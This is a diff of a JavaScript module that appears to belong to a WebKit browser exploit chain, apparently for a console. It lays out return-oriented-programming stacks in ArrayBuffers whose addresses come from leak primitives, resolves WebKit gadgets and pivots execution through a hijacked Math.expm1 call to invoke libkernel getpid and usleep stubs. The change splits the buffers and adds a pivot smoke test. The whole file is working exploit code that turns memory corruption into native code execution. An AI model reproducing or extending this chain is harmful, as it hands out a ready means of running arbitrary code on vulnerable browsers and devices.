@@ -1,6 +1,6 @@
 /**
  * Math.expm1 pivot native call — poops-style ROP (chain_poops.js).
- * Single-slab ctx = 1 leakval. stageGetpid + fireGetpid split for OOM headroom.
+ * Separate ArrayBuffers (same as chain_poops). Fire at PRIMITIVE-OK when lk known.
  */
 import { int64 } from "./int64.js";
 import { PIVOT_ROWS, verifyPivotSet } from "./pivot_gadgets.js";
@@ -8,12 +8,7 @@ import { PIVOT_ROWS, verifyPivotSet } from "./pivot_gadgets.js";
 export const SYS = { getpid: 20, getuid: 0x18 };
 
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
-const OFF_STORE = 0;
-const OFF_PIVOT = 0x40;
-const OFF_STACK = 0x100;
-const STACK_SIZE = 0x800;
-const SLAB_SIZE = OFF_STACK + STACK_SIZE;
-const OFF_FRAME = OFF_STACK + STACK_SIZE - 0x40;
+const STACK_SIZE = 0x2000;
 
 const GADGET_TABLE = [
     ["POP_RDI_RET", "wk_POP_RDI_RET", [0x5f, 0xc3]],
@@ -63,37 +58,50 @@ function put(dv, at, v) {
     }
 }
 
-function buildSlabCtx(p, off, G) {
+/** chain_poops makeCtx — store / pivot / stack / frame are separate ArrayBuffers. */
+function buildSlabCtx(p, off, G, keepAlive) {
     const pivotSp = off.pivot_view_sp;
     const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
-    const slab = new ArrayBuffer(SLAB_SIZE);
-    const base = bufAddr(p, off, slab);
-    const M = {
-        slab,
+    const sb = new ArrayBuffer(0x20);
+    const pb = new ArrayBuffer(PB_SIZE);
+    const kb = new ArrayBuffer(STACK_SIZE);
+    const fb = new ArrayBuffer(0x40);
+    keepAlive.push(sb, pb, kb, fb);
+    const storeDv = new DataView(sb);
+    const pivotDv = new DataView(pb);
+    const stackDv = new DataView(kb);
+    const frameDv = new DataView(fb);
+    const stackU8 = new Uint8Array(kb);
+    const frameU8 = new Uint8Array(fb);
+    const S = bufAddr(p, off, sb);
+    const P = bufAddr(p, off, pb);
+    const K = bufAddr(p, off, kb);
+    const F = bufAddr(p, off, fb);
+    put(storeDv, 0x00, G.G1);
+    put(storeDv, 0x08, P);
+    put(storeDv, 0x10, G.G3);
+    put(storeDv, 0x18, G.G2);
+    put(pivotDv, 0x00, P);
+    put(pivotDv, 0x10, G.G5);
+    put(pivotDv, 0x20, G.G4);
+    return {
         stackSize: STACK_SIZE,
         pivotSp,
-        storeDv: new DataView(slab, OFF_STORE, 0x20),
-        pivotDv: new DataView(slab, OFF_PIVOT, PB_SIZE),
-        stackDv: new DataView(slab, OFF_STACK, STACK_SIZE),
-        frameDv: new DataView(slab, OFF_FRAME, 0x40),
-        stackU8: new Uint8Array(slab, OFF_STACK, STACK_SIZE),
-        frameU8: new Uint8Array(slab, OFF_FRAME, 0x40),
-        S: base.add32(OFF_STORE),
-        P: base.add32(OFF_PIVOT),
-        K: base.add32(OFF_STACK),
-        F: base.add32(OFF_FRAME),
+        storeDv,
+        pivotDv,
+        stackDv,
+        frameDv,
+        stackU8,
+        frameU8,
+        S,
+        P,
+        K,
+        F,
+        bufs: [sb, pb, kb, fb],
     };
-    put(M.storeDv, 0x00, G.G1);
-    put(M.storeDv, 0x08, M.P);
-    put(M.storeDv, 0x10, G.G3);
-    put(M.storeDv, 0x18, G.G2);
-    put(M.pivotDv, 0x00, M.P);
-    put(M.pivotDv, 0x10, G.G5);
-    put(M.pivotDv, 0x20, G.G4);
-    return M;
 }
 
-/** One slab + pivot handles — call at PRIMITIVE-OK while memory is fresh. */
+/** One ctx + pivot handles — call while heap is fresh (PRIMITIVE-OK). */
 export function prepNativeChain(p, off, webkitBase, cap) {
     if (!p || !off || !webkitBase)
         throw new Error("prepNativeChain: need p, off, webkitBase");
@@ -101,7 +109,8 @@ export function prepNativeChain(p, off, webkitBase, cap) {
     if (!resolved.G || resolved.bad.length)
         throw new Error("prepNativeChain: gadget-bad " + resolved.bad.join(","));
     const G = resolved.G;
-    const M = buildSlabCtx(p, off, G);
+    const keepAlive = [];
+    const M = buildSlabCtx(p, off, G, keepAlive);
     let mainMf, mainOrig, pivotObj, pivotCell;
     if (cap && cap.mainMf && cap.mainOrig != null && cap.pivotCell) {
         mainMf = cap.mainMf;
@@ -116,6 +125,7 @@ export function prepNativeChain(p, off, webkitBase, cap) {
         pivotObj = {};
         pivotCell = p.leakval(pivotObj);
     }
+    keepAlive.push(pivotObj);
     return {
         M,
         G,
@@ -123,7 +133,7 @@ export function prepNativeChain(p, off, webkitBase, cap) {
         mainOrig,
         pivotCell,
         pivotObj,
-        keepAlive: [M.slab, pivotObj],
+        keepAlive,
         webkitBase,
         staged: false,
         mainArmed: false,
@@ -159,7 +169,6 @@ export function layoutGetpidSlab(M, G, stub) {
     layoutNativeCall(M, G, stub, []);
 }
 
-/** Tap 1 — layout only (mainMf armed on fire for headroom). */
 export function stageGetpid(p, prep, libkernelBase, off) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("stageGetpid: no prep");
@@ -168,33 +177,28 @@ export function stageGetpid(p, prep, libkernelBase, off) {
         stubOff = off.k_stubs[SYS.getpid];
     if (stubOff == null)
         stubOff = 0x4fa;
-    const stub = libkernelBase.add32(stubOff);
-    layoutGetpidSlab(prep.M, prep.G, stub);
+    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
     prep.staged = true;
-    prep.fireTarget = stub;
-    prep.fireKind = "getpid+" + stubOff.toString(16);
-    prep.fireLk = libkernelBase;
-    prep.fireOff = off;
-    prep.fireUsec = null;
 }
 
-/** Safer HW proof — Suchi-confirmed wrapper @ +0x13b20. */
 export function stageUsleep(p, prep, libkernelBase, off, usec) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("stageUsleep: no prep");
     const fnOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
-    const fn = libkernelBase.add32(fnOff);
     const arg = new int64((usec != null ? usec : 1000) >>> 0, 0);
-    layoutNativeCall(prep.M, prep.G, fn, [arg]);
+    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(fnOff), [arg]);
     prep.staged = true;
-    prep.fireTarget = fn;
-    prep.fireKind = "usleep+" + fnOff.toString(16);
-    prep.fireLk = libkernelBase;
-    prep.fireOff = off;
-    prep.fireUsec = usec != null ? usec : 1000;
 }
 
-/** chain_poops callAddr — layout fresh, pivot, expm1, restore. No logging here. */
+/** Pivot only — webkit POP_RAX, no libkernel (bisect lk vs chain). */
+export function firePivotSmoke(p, prep) {
+    if (!prep || !prep.M || !prep.G)
+        throw new Error("firePivotSmoke: no prep");
+    layoutNativeCall(prep.M, prep.G, prep.G.POP_RAX_RET, [new int64(0, 0)]);
+    return fireNativeCall(p, prep);
+}
+
+/** chain_poops callAddr — no logging, no DOM. */
 export function fireNativeCall(p, prep) {
     if (!prep || !prep.M)
         throw new Error("fireNativeCall: no prep");
@@ -212,18 +216,15 @@ export function fireNativeCall(p, prep) {
     return prep.M.frameDv.getUint32(0, true) | 0;
 }
 
-/** Re-layout + fire atomically (poops OOM-safe — no gap between arm and expm1). */
 export function fireUsleep(p, prep, libkernelBase, off, usec) {
     stageUsleep(p, prep, libkernelBase, off, usec);
     return fireNativeCall(p, prep);
 }
 
-/** Tap 2 — fire expm1 pivot + disarm. */
 export function fireGetpid(p, prep) {
     return fireNativeCall(p, prep);
 }
 
-/** Inline: stage + fire (use immediately after prep on Save bases). */
 export function runGetpidFromPrep(p, prep, libkernelBase, off) {
     stageGetpid(p, prep, libkernelBase, off);
     return fireGetpid(p, prep);
